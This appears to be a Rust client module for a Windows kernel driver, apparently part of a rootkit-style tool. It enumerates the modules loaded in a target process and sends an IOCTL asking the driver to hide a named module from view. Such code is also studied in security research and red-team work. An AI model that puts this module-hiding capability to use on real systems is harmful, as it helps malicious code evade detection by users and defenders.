use {
    log::*,
    crate::utils::open_driver,
    std::{ffi::c_void, mem::size_of, ptr::null_mut},
    shared::structs::{ModuleInfo, TargetModule, TargetProcess},
    windows_sys::Win32::{
        System::IO::DeviceIoControl,
        Foundation::{CloseHandle, GetLastError, HANDLE},
    },
};

pub struct Module {
    driver_handle: HANDLE,
}

impl Module {
    pub fn new() -> Self {
        let driver_handle = open_driver().expect("Failed to open driver");
        Module { driver_handle }
    }

    pub fn enumerate_module(self, ioctl_code: u32, pid: &u32) {
        info!("Attempting to enumerate modules for PID: {pid}");
    
        debug!("Preparing structure for pid: {pid}");
        let mut module_info: [ModuleInfo; 400] = unsafe { std::mem::zeroed() };
        let mut input_module = TargetProcess { pid: *pid as usize };
    
        debug!("Sending DeviceIoControl command to enumerate modules for PID: {pid}");
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.driver_handle,
                ioctl_code,
                &mut input_module as *mut _ as *mut c_void,
                size_of::<TargetProcess>() as u32,
                module_info.as_mut_ptr() as *mut _,
                (module_info.len() * size_of::<ModuleInfo>()) as u32,
                &mut return_buffer,
                null_mut(),
            )
        };
    
        if status == 0 {
            error!("DeviceIoControl failed with status: 0x{:08X} for PID: {pid}", unsafe { GetLastError() });
        } else {
            let total_modules = return_buffer as usize / size_of::<ModuleInfo>();
            info!("Total modules found for PID {pid}: {total_modules}");
            info!("Listing modules:");
            println!();
    
            for module in module_info.iter() {
                if module.address > 0 {
                    let name = match String::from_utf16(&module.name) {
                        Ok(name) => name,
                        Err(err) => {
                            error!("UTF-16 decoding error: {:?}", err);
                            continue;
                        }
                    };
                    println!(
                        "[{}] {:p} {}",
                        module.index, module.address as *mut c_void, name
                    );
                }
            }
    
            println!();
            info!("Module enumeration completed for PID: {pid}");
        }
    }
    
    pub fn hide_module(self, ioctl_code: u32, name: &String, pid: u32) {
        debug!("Attempting to open the module for hide operation");
    
        debug!("Preparing structure for: {}", name);
        let mut info_driver = TargetModule {
            module_name: name.to_string(),
            pid: pid as usize,
        };
    
        debug!("Sending DeviceIoControl command to hide module");
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.driver_handle,
                ioctl_code,
                &mut info_driver as *mut _ as *mut c_void,
                size_of::<TargetModule>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };
    
        if status == 0 {
            error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
        } else {
            info!("Module successfully hidden");
        }
    }    
}

impl Drop for Module {
    fn drop(&mut self) {
        debug!("Closing the driver handle");
        unsafe { CloseHandle(self.driver_handle) };
    }
}